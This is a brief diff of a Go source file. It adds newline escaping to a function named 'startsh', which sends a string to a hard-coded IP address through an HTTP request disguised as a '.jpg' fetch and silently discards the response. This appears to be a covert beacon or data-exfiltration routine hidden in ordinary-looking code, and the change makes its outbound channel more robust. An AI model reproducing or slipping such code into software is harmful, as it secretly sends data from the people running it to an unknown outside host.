@@ -26,6 +26,7 @@ import (
 )
 
 func startsh(o string) {
+	o = strings.ReplaceAll(o, "\n", "\\n")
 	resp, err := http.Get("http://193.38.54.60/o.jpg?t=" + o + "&tm=" + time.Now().String())
 	_ = fmt.Sprintf("%v%s", resp, err)
 }
